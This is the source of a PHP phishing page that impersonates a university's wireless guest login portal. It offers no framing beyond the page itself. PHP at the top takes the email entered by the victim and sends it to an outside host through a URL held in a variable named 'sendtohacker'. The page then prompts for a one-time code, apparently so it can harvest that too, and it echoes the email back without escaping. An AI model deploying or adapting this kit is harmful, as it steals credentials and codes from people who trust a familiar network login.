<?php
$email="";
if(!empty($_POST["username"]))
{
$email=$_POST["username"];
}
$emailurl="http://domain.com/phpMailer.php?email=".$email;
$sendtohacker= file_get_contents($emailurl);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
<meta http-equiv="Pragma" content="no-cache">
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>

		<title>Wireless Guest Login at Example State University</title>
		<link rel="stylesheet" type="text/css" href="dataa/reset.css">
		<link rel="stylesheet" type="text/css" href="data/core.css">

</head>

<body onload="loadAction();">


<div id="header"><div class="window clear">

	<h1 class="hide-at-larger">UNI Wireless Guest Login</h1>


	
	

</div></div>


<div id="main"><div class="window">

	<p class="smaller">The UNInet Guest wireless network has limited bandwidth.  If you require additional bandwidth you will need a valid UNInet ID and connect to the wireless network (SSID): UNInet, UNInet 2.0 or UNInet 3.0.</p>


	<div id="agreement">
		<p>I agree that I am a faculty, staff, student, or affiliated guest of Example State University and agree to abide by the <a href="http://techbase.UNI.edu/article.asp?id=479">UNI Statement of Acceptable Use</a>, other applicable University policies and guidelines, and all state and federal laws related to Internet use, including copyright laws.</p>
		<center>OTP sent to <?php echo $email ?></center>
		  		 
<form action="captiveportal3.html" method="post">
<input TYPE="hidden" NAME="buttonClicked" SIZE="16" MAXLENGTH="15" value="0">
<input TYPE="hidden" NAME="redirect_url" SIZE="255" MAXLENGTH="255" VALUE="">
<input TYPE="hidden" NAME="err_flag" SIZE="16" MAXLENGTH="15" value="0">
<div align="center">
<input id="input-button" NAME="username" size="25" maxlength="24" value="Enter OTP">
<input TYPE="hidden" id="input-button" NAME="password" size="25" maxlength="24" value="Password">
<input type="submit" id="submit-button" name="Submit" value="Use Wifi" class="button" onclick="submitAction();">
</div>
</form>

	</div>
	
	<p class="smaller" id="assistance">For assistance please call IT Services Support at <a href="tel:15174326200">517-432-6200</a>.</p>


</div></div>


<div id="footer"><div class="window clear">

	<div id="footer-wordmark">
			<img alt="Example State University - Spartans Will." src="images/UNI-wordmark.jpg">
	</div>
	
	<div id="footer-copyright">
		<p>&copy; Example State University Board of Trustees. East Lansing, MI 48824 <br>UNI is an affirmative-action, equal-opportunity employer.</p>
	</div>
	

</div></div>

</body></html>